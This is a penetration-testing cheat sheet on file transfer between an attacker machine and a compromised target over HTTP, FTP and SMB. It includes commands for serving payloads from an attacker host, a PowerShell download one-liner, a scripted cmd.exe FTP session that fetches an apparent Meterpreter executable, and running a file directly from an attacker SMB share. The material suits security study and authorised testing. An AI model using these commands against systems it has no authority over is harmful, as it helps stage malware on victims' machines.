# File Transfer

File can either be transferred by:

* Push file to target
* Have the target to pull file back

## HTTP

**On attacker machine**:

### Apache

copy file to `/var/www/html/`

Start Apache Server

> /etc/init.d/apache2 start

### Python

By running below, current directory will be accessible over HTTP

> python -m SimpleHTTPServer \[port no\]

**On target machine**:

> [http://your\_ip\_address:your\_port\_num/filename](http://your_ip_address:your_port_num/filename)

If you only have command line access in a Windows machine, use PowerShell's WebClient object:

> powershell -c "\(new-object System.Net.WebClient\).DownloadFile\('[http://your\_ip\_address:your\_port\_num/filename','C:\Users\dest\_path\file\_name](http://your_ip_address:your_port_num/filename','C:\\Users\\dest_path\\file_name)'\)"

or use cmd.exe to trigger IE

> cd Program Files\Internet Explorer start iexplore.exe \[[http://ip](http://ip) address/file\]

## FTP

### vsftpd/pytftpd

**On attacker machine**:

`vsftpd` or simply the `pytftpd` library

> apt-get install python-pyftpdlib
>
> python -m pyftpdlib -p \[port\_num\]

default port is 2121

`-w` can grant the user write access

### Metasploit

Metasploit has an ftp module `auxiliary/server/ftp`

> use auxiliary/server/ftp
>
> set FTPROOT /root/shells
>
> exploit

Can be kill with:

> jobs -k \[id\]

**On target machine**:

Type it into your cmd.exe

> echo open your\_ip\_address&gt;ftp\_commands.txt  
> echo anonymous&gt;&gt;ftp\_commands.txt  
> echo whatever&gt;&gt;ftp\_commands.txt  
> echo binary&gt;&gt;ftp\_commands.txt  
> echo get met8888.exe&gt;&gt;ftp\_commands.txt  
> echo bye&gt;&gt;ftp\_commands.txt  
> ftp -s:ftp\_commands.txt

## SMB

**On attacker machine**:

> `smbserver.py shareName sharePath` `(e.g. smbserver.py TMP /tmp)`

Check with smbclient

> `smbclient -L [your ip address] --no-pass`

**On target machine**: or check on Windows

> `net view \\\\[attack machine ip address]`

Copy file `copy \\[your ip address]\Sharepath .`

Or execute the file directly from SMB `\\[your ip address]\file.exe`

